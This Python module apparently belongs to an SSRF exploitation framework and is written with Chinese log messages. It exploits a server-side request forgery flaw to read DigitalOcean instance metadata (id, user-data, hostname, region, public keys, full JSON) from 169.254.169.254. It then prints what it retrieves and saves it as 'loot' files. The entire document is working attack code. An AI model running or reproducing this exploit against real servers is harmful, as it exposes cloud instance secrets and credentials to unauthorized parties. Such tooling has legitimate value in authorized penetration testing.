import logging

from core.utils import *

name = "digitalocean"
description = "读取 Digital Ocean 云平台上的敏感数据"
author = "Swissky"
documentation = ["https://developers.digitalocean.com/documentation/metadata/"]


class exploit:
    endpoints = set()

    def __init__(self, requester, args):
        logging.info(f"模块 '{name}' 已启动！")
        self.add_endpoints()

        r = requester.do_request(args.param, "")
        if r != None:
            default = r.text

            for endpoint in self.endpoints:
                payload = wrapper_http(endpoint[1], endpoint[0], "80")
                r = requester.do_request(args.param, payload)
                diff = diff_text(r.text, default)
                if diff != "":
                    # 显示默认请求与 SSRF 请求之间的差异
                    logging.info(f"\033[32m读取文件\033[0m : {payload}")
                    print(diff)

                    # 将差异写入文件
                    filename = endpoint[1].split("/")[-1]
                    output_path = loot_path(requester.host, filename)
                    logging.info(f"\033[32m写入文件\033[0m : {payload} 到 {output_path}")
                    output_path.write_text(diff, encoding="utf-8")

    def add_endpoints(self):
        self.endpoints.add(("169.254.169.254", "metadata/v1/id"))
        self.endpoints.add(("169.254.169.254", "metadata/v1/user-data"))
        self.endpoints.add(("169.254.169.254", "metadata/v1/hostname"))
        self.endpoints.add(("169.254.169.254", "metadata/v1/region"))
        self.endpoints.add(("169.254.169.254", "metadata/v1/public-keys"))
        self.endpoints.add(("169.254.169.254", "metadata/v1.json"))
